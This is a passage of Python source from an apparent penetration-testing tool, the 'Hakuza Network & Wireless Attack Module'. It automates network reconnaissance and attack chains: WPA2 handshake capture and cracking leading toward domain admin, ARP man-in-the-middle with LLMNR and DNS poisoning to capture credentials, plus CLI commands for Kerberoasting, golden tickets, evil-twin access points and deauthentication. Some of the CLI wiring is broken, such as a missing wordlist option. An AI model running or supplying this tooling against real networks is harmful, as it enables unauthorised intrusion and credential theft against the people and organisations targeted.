            cmd = ["nmap", "-sV", "-p", port_str, target_ip]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            for line in result.stdout.split('\n'):
                if '/tcp' in line or '/udp' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        port = int(parts[0].split('/')[0])
                        service = ' '.join(parts[2:])
                        services[port] = service
                        self.logger.debug(f"[+] {port}: {service}")

            self.logger.info(f"[+] Found {len(services)} services")

        except FileNotFoundError:
            self.logger.error("nmap not found")
        except Exception as e:
            self.logger.error(f"Service enumeration failed: {e}")

        return services

    def find_domain_controllers(self, network_range: str) -> List[NetworkHost]:
        """
        Identify Domain Controllers in network
        Looks for Kerberos (port 88), LDAP (389), SMB (445)
        """
        self.logger.info(f"[*] Scanning for Domain Controllers in {network_range}...")

        domain_controllers = []

        try:
            # Nmap scan for DC indicators
            cmd = [
                "nmap", "-p", "88,389,445,3268,3389",
                "-sV", "--open", network_range
            ]

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            for line in result.stdout.split('\n'):
                if 'Nmap scan report' in line:
                    ip = line.split()[-1]
                    host = NetworkHost(ip=ip, mac="", hostname="")
                    domain_controllers.append(host)
                    self.logger.info(f"[+] Potential DC: {ip}")

            self.logger.info(f"[+] Found {len(domain_controllers)} potential DCs")

        except Exception as e:
            self.logger.error(f"DC scan failed: {e}")

        return domain_controllers


# ============================================================================
# ATTACK CHAIN AUTOMATION
# ============================================================================

class AttackChains:
    """Pre-built attack chains for real-world scenarios"""

    def __init__(self, logger: Logger, scope: ScopeValidator):
        self.logger = logger
        self.scope = scope
        self.l2 = Layer2Attacks(logger, scope)
        self.creds = CredentialCapture(logger, scope)
        self.krb = KerberosAttacks(logger, scope)
        self.wireless = WirelessAttacks(logger, scope)
        self.recon = NetworkRecon(logger, scope)

    def wifi_to_domain_admin(self, ssid: str, bssid: str, interface: str,
                             network_range: str = "192.168.1.0/24",
                             wordlist: str = None) -> bool:
        """
        Full attack chain: WiFi crack -> Network access -> Domain compromise

        1. Capture & crack WPA2 handshake
        2. Connect to network (automatic or manual)
        3. LLMNR poison to capture credentials
        4. Use captured creds for domain access
        5. Domain escalation to admin
        """
        self.logger.info("=" * 70)
        self.logger.info("[*] CHAIN: WiFi -> Domain Admin")
        self.logger.info("=" * 70)

        try:
            # Step 1: Capture handshake
            self.logger.info("\n[STEP 1] Capturing WiFi handshake...")
            cap_file = f"/tmp/{ssid}_{bssid.replace(':', '')}.pcap"
            if not self.wireless.capture_handshake(ssid, bssid, interface, cap_file):
                return False

            # Step 2: Crack WPA2
            self.logger.info("\n[STEP 2] Cracking WPA2...")
            password = self.wireless.crack_wpa2(cap_file, wordlist)
            if not password:
                return False
            self.logger.info(f"[+] Network password: {password}")

            # Step 3: Discover network infrastructure
            self.logger.info("\n[STEP 3] Discovering network infrastructure...")
            hosts = self.recon.arp_scan(network_range, interface)
            self.logger.info(f"[+] Discovered {len(hosts)} hosts")

            dcs = self.recon.find_domain_controllers(network_range)
            if not dcs:
                self.logger.warning("[!] No domain controllers found")
                return False

            dc_ip = dcs[0].ip
            self.logger.info(f"[+] Domain Controller: {dc_ip}")

            # Step 4: LLMNR poison to capture admin credentials
            self.logger.info("\n[STEP 4] Starting credential capture (LLMNR poisoning)...")
            self.creds.llmnr_poison(interface, "0.0.0.0")  # Listen on all IPs

            self.logger.info("[*] LLMNR poisoning active - waiting for admin authentication...")
            self.logger.info("[*] Trigger admin to access file share or trigger LLMNR query")

            # Step 5: Would proceed to use captured credentials for domain attack
            self.logger.info("\n[STEP 5] Ready for credential relay...")
            self.logger.info("[*] Next: Use captured NTLM hashes for:")
            self.logger.info("    - NTLM relay to DC (DCSync)")
            self.logger.info("    - Kerberoasting with admin credentials")
            self.logger.info("    - Golden ticket generation")

            return True

        except Exception as e:
            self.logger.error(f"Attack chain failed: {e}")
            return False

    def arp_mitm_credential_capture(self, target1: str, target2: str,
                                    interface: str) -> bool:
        """
        ARP MITM -> DNS/credential capture chain

        1. Position as MITM between target1 and target2
        2. Capture DNS queries
        3. Poison DNS for targeted domains
        4. Capture credentials sent to spoofed servers
        """
        self.logger.info("=" * 70)
        self.logger.info("[*] CHAIN: ARP MITM -> Credential Capture")
        self.logger.info("=" * 70)

        try:
            # Step 1: ARP MITM setup
            self.logger.info("\n[STEP 1] Setting up ARP MITM...")
            if not self.l2.arp_mitm(target1, target2, interface):
                return False

            self.logger.info(f"[+] MITM active: {target1} <-> {target2}")

            # Step 2: Start credential capture listeners
            self.logger.info("\n[STEP 2] Starting credential capture...")
            self.creds.llmnr_poison(interface, "0.0.0.0")

            # Step 3: DNS spoofing for common services
            common_services = [
                "file.example.com",
                "mail.example.com",
                "web.example.com"
            ]

            for service in common_services:
                self.creds.dns_spoof(interface, service, "0.0.0.0")
                self.logger.info(f"[+] DNS poison active: {service}")

            self.logger.info("[*] Waiting for credential captures...")
            return True

        except Exception as e:
            self.logger.error(f"Attack chain failed: {e}")
            return False


# ============================================================================
# CLI INTERFACE
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Hakuza Network & Wireless Attack Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 mod_network_wireless.py network --scan --interface eth0
  python3 mod_network_wireless.py arp-mitm --target1 192.168.1.100 --target2 192.168.1.1
  python3 mod_network_wireless.py wifi-scan --interface wlan0
  python3 mod_network_wireless.py chain wifi-domain --ssid "TargetNet" --bssid "AA:BB:CC:DD:EE:FF"
        """
    )

    subparsers = parser.add_subparsers(dest="command", help="Attack module")

    # Network enumeration
    net_parser = subparsers.add_parser("network", help="Network reconnaissance")
    net_parser.add_argument("--scan", action="store_true", help="Perform ARP scan")
    net_parser.add_argument("--range", default="192.168.1.0/24", help="Network range")
    net_parser.add_argument("--interface", help="Network interface")
    net_parser.add_argument("--enum-services", action="store_true")
    net_parser.add_argument("--find-dc", action="store_true", help="Find domain controllers")

    # ARP attacks
    arp_parser = subparsers.add_parser("arp-spoof", help="ARP spoofing")
    arp_parser.add_argument("--target", required=True, help="Target IP")
    arp_parser.add_argument("--spoof-ip", required=True, help="IP to impersonate")
    arp_parser.add_argument("--interface", help="Network interface")
    arp_parser.add_argument("--count", type=int, help="Number of packets (continuous if omitted)")

    arp_mitm = subparsers.add_parser("arp-mitm", help="ARP MITM")
    arp_mitm.add_argument("--target1", required=True, help="First target IP")
    arp_mitm.add_argument("--target2", required=True, help="Second target IP")
    arp_mitm.add_argument("--interface", help="Network interface")

    # Credential capture
    creds_parser = subparsers.add_parser("capture-creds", help="Credential capture")
    creds_parser.add_argument("--llmnr", action="store_true")
    creds_parser.add_argument("--nbt-ns", action="store_true")
    creds_parser.add_argument("--dns-spoof", help="Domain to spoof")
    creds_parser.add_argument("--spoof-ip", required=True)
    creds_parser.add_argument("--interface", help="Network interface")

    # Kerberos attacks
    krb_parser = subparsers.add_parser("kerberos", help="Kerberos attacks")
    krb_parser.add_argument("--asreproast", action="store_true")
    krb_parser.add_argument("--kerberoast", action="store_true")
    krb_parser.add_argument("--golden-ticket", action="store_true")
    krb_parser.add_argument("--dc", required=True, help="Domain Controller IP")
    krb_parser.add_argument("--domain", required=True, help="Domain name")

    # WiFi attacks
    wifi_parser = subparsers.add_parser("wifi", help="WiFi attacks")
    wifi_parser.add_argument("--scan", action="store_true")
    wifi_parser.add_argument("--capture", action="store_true", help="Capture handshake")
    wifi_parser.add_argument("--crack", help="Crack handshake from file")
    wifi_parser.add_argument("--evil-twin", action="store_true")
    wifi_parser.add_argument("--deauth", action="store_true")
    wifi_parser.add_argument("--ssid", help="SSID/AP name")
    wifi_parser.add_argument("--bssid", help="BSSID/MAC address")
    wifi_parser.add_argument("--interface", help="Wireless interface (wlan0)")
    wifi_parser.add_argument("--channel", type=int, help="WiFi channel")
    wifi_parser.add_argument("--wordlist", help="Password wordlist")

    # Bluetooth attacks
    bt_parser = subparsers.add_parser("bluetooth", help="Bluetooth attacks")
    bt_parser.add_argument("--scan", action="store_true")

    # Attack chains
    chain_parser = subparsers.add_parser("chain", help="Attack chains")
    chain_parser.add_argument("--wifi-domain", action="store_true",
                             help="WiFi -> Domain Admin chain")
    chain_parser.add_argument("--arp-creds", action="store_true",
                             help="ARP MITM -> Credential capture chain")
    chain_parser.add_argument("--ssid", help="WiFi SSID")
    chain_parser.add_argument("--bssid", help="WiFi BSSID")
    chain_parser.add_argument("--interface", help="Network interface")
    chain_parser.add_argument("--target1", help="First target IP")
    chain_parser.add_argument("--target2", help="Second target IP")
    chain_parser.add_argument("--range", default="192.168.1.0/24")

    args = parser.parse_args()

    # Initialize logger and scope validator
    logger = Logger()
    scope = ScopeValidator()

    try:
        if args.command == "network":
            recon = NetworkRecon(logger, scope)

            if args.scan:
                hosts = recon.arp_scan(args.range, args.interface)
                for host in hosts:
                    print(f"{host.ip:20} {host.mac}")

            if args.find_dc:
                dcs = recon.find_domain_controllers(args.range)
                for dc in dcs:
                    print(f"[DC] {dc.ip}")

        elif args.command == "arp-spoof":
            l2 = Layer2Attacks(logger, scope)
            l2.arp_spoof(args.target, args.spoof_ip, args.interface, args.count)

        elif args.command == "arp-mitm":
            l2 = Layer2Attacks(logger, scope)
            l2.arp_mitm(args.target1, args.target2, args.interface)
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("[*] ARP MITM stopped")

        elif args.command == "capture-creds":
            creds = CredentialCapture(logger, scope)

            if args.llmnr:
                creds.llmnr_poison(args.interface, args.spoof_ip)
            if args.nbt_ns:
                creds.nbt_ns_poison(args.interface, args.spoof_ip)
            if args.dns_spoof:
                creds.dns_spoof(args.interface, args.dns_spoof, args.spoof_ip)

            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                logger.info("[*] Credential capture stopped")

        elif args.command == "wifi":
            wireless = WirelessAttacks(logger, scope)

            if args.scan:
                networks = wireless.wifi_scan(args.interface)
                for net in networks:
                    print(f"{net.ssid:30} {net.bssid:20} CH:{net.channel:3} {net.encryption}")

            elif args.capture:
                wireless.capture_handshake(args.ssid, args.bssid, args.interface)

            elif args.crack:
                result = wireless.crack_wpa2(args.crack, args.wordlist)
                if result:
                    print(f"[+] Password: {result}")

            elif args.evil_twin:
                wireless.evil_twin(args.ssid, args.channel, args.interface)

            elif args.deauth:
                wireless.deauth_attack(args.bssid, args.interface)

        elif args.command == "bluetooth":
            wireless = WirelessAttacks(logger, scope)

            if args.scan:
                devices = wireless.bluetooth_scan()
                for dev in devices:
                    print(f"{dev['mac']:20} {dev['name']}")

        elif args.command == "chain":
            chains = AttackChains(logger, scope)

            if args.wifi_domain:
                chains.wifi_to_domain_admin(args.ssid, args.bssid, args.interface,
                                           args.range, args.wordlist)
            elif args.arp_creds:
                chains.arp_mitm_credential_capture(args.target1, args.target2,
                                                   args.interface)

    except AuthorizationError as e:
        logger.error(f"[!] Authorization denied: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        logger.info("\n[*] Stopped by user")
    except Exception as e:
        logger.error(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
